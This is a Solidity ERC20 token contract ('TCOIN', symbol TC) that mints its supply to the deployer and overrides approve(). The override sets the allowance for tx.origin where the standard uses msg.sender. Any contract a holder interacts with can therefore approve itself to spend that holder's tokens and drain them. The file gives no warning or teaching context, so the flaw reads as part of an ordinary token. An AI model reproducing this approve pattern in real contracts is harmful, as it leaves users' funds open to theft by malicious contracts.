// contracts/GLDToken.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";

contract ERC20Custom is ERC20, ERC20Burnable {
    constructor(uint256 initialSupply) ERC20("TCOIN", "TC") {
        _mint(msg.sender, initialSupply);
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(tx.origin, spender, amount);
        return true;
    }

    function getAddress() public view returns (address) {
        return address(this);
    }
}